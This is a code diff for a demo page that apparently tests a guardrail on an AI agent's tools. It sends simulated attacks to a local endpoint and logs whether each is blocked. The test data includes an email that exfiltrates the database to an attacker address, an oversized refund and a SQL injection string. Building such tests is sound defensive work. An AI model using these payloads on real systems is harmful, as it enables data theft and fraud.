@@ -31,22 +31,22 @@
             <div class="card">
                 <h3>Data Exfiltration</h3>
                 <p>Attempt to send the customer database to an external attacker's email.</p>
-                <button class="danger" onclick="runAttack('email', {to: 'attacker@external-audit.com', subject: 'Stolen Data', body: 'Here is the DB...'})">Send Malicious Email</button>
+                <button class="danger" onclick="runAttack('email')">Send Malicious Email</button>
             </div>
             <div class="card">
                 <h3>Massive Refund</h3>
                 <p>Attempt to issue a $5000 refund (Limit is $500).</p>
-                <button class="danger" onclick="runAttack('refund', {customer_id: 2, amount: 5000})">Issue $5000 Refund</button>
+                <button class="danger" onclick="runAttack('refund')">Issue $5000 Refund</button>
             </div>
             <div class="card">
                 <h3>SQL Injection</h3>
                 <p>Attempt to dump the database using a SQL injection payload.</p>
-                <button class="danger" onclick="runAttack('search', {name: \"' OR '1'='1\"})">Run SQL Injection</button>
+                <button class="danger" onclick="runAttack('search')">Run SQL Injection</button>
             </div>
             <div class="card">
                 <h3>Legitimate Action</h3>
                 <p>Check a normal ticket (Should be ALLOWED).</p>
-                <button onclick="runAttack('ticket', {ticket_id: 1})">Read Ticket #1</button>
+                <button onclick="runAttack('ticket')">Read Ticket #1</button>
             </div>
         </div>
 
@@ -55,6 +55,14 @@
     </div>
 
     <script>
+        // Define the payloads here in JS to avoid HTML escaping bugs
+        const ATTACKS = {
+            email:  { tool: 'email',  args: { to: 'attacker@external-audit.com', subject: 'Stolen Data', body: 'Here is the DB...' } },
+            refund: { tool: 'refund', args: { customer_id: 2, amount: 5000 } },
+            search: { tool: 'search', args: { name: "' OR '1'='1" } },
+            ticket: { tool: 'ticket', args: { ticket_id: 1 } }
+        };
+
         function addLog(message, type) {
             const consoleDiv = document.getElementById('console');
             const entry = document.createElement('div');
@@ -64,22 +72,26 @@
             consoleDiv.scrollTop = consoleDiv.scrollHeight;
         }
 
-        async function runAttack(attackType, args) {
-            addLog(`Initiating attack: ${attackType}`, 'info');
+        async function runAttack(attackId) {
+            const attack = ATTACKS[attackId];
+            addLog(`Initiating attack: ${attackId}`, 'info');
             
-            // This calls our new custom FastAPI endpoint
-            const response = await fetch('/api/test-attack', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ tool: attackType, args: args })
-            });
-            
-            const data = await response.json();
-            
-            if (data.status === 'denied') {
-                addLog(`🛡️ BLOCKED: ${data.reason}`, 'denied');
-            } else {
-                addLog(`⚠️ ALLOWED: ${data.result}`, 'allowed');
+            try {
+                const response = await fetch('/api/test-attack', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(attack)
+                });
+                
+                const data = await response.json();
+                
+                if (data.status === 'denied') {
+                    addLog(`🛡️ BLOCKED: ${data.reason}`, 'denied');
+                } else {
+                    addLog(`⚠️ ALLOWED: ${data.result}`, 'allowed');
+                }
+            } catch (err) {
+                addLog(`Error: ${err.message}`, 'denied');
             }
         }
     </script>
